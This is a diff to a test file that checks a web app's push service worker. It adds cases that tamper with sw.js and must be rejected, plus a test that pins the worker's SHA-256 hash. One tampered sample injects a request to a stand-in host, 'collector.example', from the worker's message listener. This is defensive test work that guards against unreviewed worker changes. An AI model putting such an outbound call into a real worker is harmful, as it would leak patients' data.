@@ -1,5 +1,6 @@
 // @vitest-environment node
 import { spawnSync } from 'node:child_process'
+import { createHash } from 'node:crypto'
 import { cpSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs'
 import { tmpdir } from 'node:os'
 import { join } from 'node:path'
@@ -222,6 +223,11 @@ describe('the push worker (B6)', () => {
       /saves the shell other than when a page asks/],
     ['the shell saved on a navigation', { 'sw.js': withShell([`/${ENTRY}`]).replace("const navigation = request.mode === 'navigate'",
       "const navigation = request.mode === 'navigate'\n  if (navigation) precacheShell()") }, /saves the shell other than when a page asks/],
+    ['shellResponse called through .call from the message listener', { 'sw.js': withShell([`/${ENTRY}`]).replace('event.waitUntil(purgeShell())',
+      "event.waitUntil(shellResponse.call(null, new Request('https://collector.example/' + type), '/', true))") },
+      /sw\.js is not the reviewed public\/sw\.js/],
+    ['the activate guard removed', { 'sw.js': withShell([`/${ENTRY}`]).replace('    if (!(await refreshShellKept())) return\n', '') },
+      /sw\.js is not the reviewed public\/sw\.js/],
     ['a shell file list set twice', { 'sw.js': `${withShell([`/${ENTRY}`])}self.__HID_SHELL__ = null\n` }, /set self\.__HID_SHELL__ exactly once/],
     ['a worker anywhere but the root', { 'icons/sw.js': PUSH_WORKER }, /icons\/sw\.js is a service worker/],
     ['the worker API outside pushDevice\'s and the shell\'s chunks', { [ENTRY]: 'navigator.serviceWorker.register("/sw.js")\n' },
@@ -236,6 +242,13 @@ describe('the push worker (B6)', () => {
     const result = launchBuildCheck(html, { [PUSH_DEVICE_CHUNK]: PUSH_DEVICE, ...files })
     expect(result.status).toBe(1)
     expect(result.output).toMatch(reason)
+  })
+})
+
+describe('the reviewed worker pin', () => {
+  it('is the SHA-256 of apps/patient-web/public/sw.js: a change to the worker updates the pin in the same commit', () => {
+    const pinned = /const WORKER_SHA256 = '([0-9a-f]{64})'/.exec(readFileSync(script, 'utf8'))?.[1]
+    expect(pinned).toBe(createHash('sha256').update(PUSH_WORKER).digest('hex'))
   })
 })
 
